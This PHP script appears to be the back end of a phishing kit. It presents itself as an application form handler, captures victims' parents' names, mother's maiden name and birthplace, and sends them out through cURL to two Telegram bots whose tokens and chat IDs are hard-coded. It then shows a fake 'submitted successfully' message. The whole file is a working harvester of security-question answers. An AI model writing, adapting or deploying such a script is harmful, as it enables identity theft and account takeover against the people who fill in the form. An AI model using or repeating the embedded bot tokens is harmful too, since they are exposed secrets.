<?php
date_default_timezone_set("UTC");

// === CONFIGURATION ===
$telegramBots = [
    [
        'bot_token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY',  // 🔁 Replace with your Bot 1 Token
        'chat_id'   => '1325797388',                // 🔁 Replace with your Bot 1 Chat ID
    ],
    [
        'bot_token' => '8173202881:AAFk6jNXvJ-5b4ZNH0gV8IfmEnOW7qdJO8U',  // 🔁 Replace with your Bot 2 Token
        'chat_id'   => '7339107338',                // 🔁 Replace with your Bot 2 Chat ID
    ],
    // ✅ Add more bots here if needed
];

// === CAPTURE FORM DATA ===
$fatherFirst  = htmlspecialchars($_POST['q105_fathersFull']['first'] ?? '');
$fatherLast   = htmlspecialchars($_POST['q105_fathersFull']['last'] ?? '');
$motherFirst  = htmlspecialchars($_POST['q106_mothersFull']['first'] ?? '');
$motherLast   = htmlspecialchars($_POST['q106_mothersFull']['last'] ?? '');
$maidenName   = htmlspecialchars($_POST['q108_mothersmaiden'] ?? '');
$birthCity    = htmlspecialchars($_POST['q107_placeofbirth'] ?? '');
$birthState   = htmlspecialchars($_POST['q30_state'] ?? '');
$consent      = isset($_POST['q52_iHereby']) ? 'YES' : 'NO';
$timestamp    = date('Y-m-d H:i:s');

// === FORMAT MESSAGE ===
$message = <<<TEXT
📝 *New Application Submission*

👨‍👧 Father's Name: $fatherFirst $fatherLast
👩‍👧 Mother's Name: $motherFirst $motherLast
👵 Maiden Name: $maidenName
🏙️ City of Birth: $birthCity
🌆 State: $birthState
✅ Consent: $consent
🕒 Time (UTC): $timestamp
TEXT;

// === SEND TO ALL TELEGRAM BOTS ===
foreach ($telegramBots as $bot) {
    $sendURL = "https://api.telegram.org/bot{$bot['bot_token']}/sendMessage";

    $payload = [
        'chat_id' => $bot['chat_id'],
        'text'    => $message,
        'parse_mode' => 'Markdown'
    ];

    // Use cURL to send
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $sendURL);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
}

// === SUCCESS OUTPUT ===
echo "✅ Application submitted successfully.";
?>
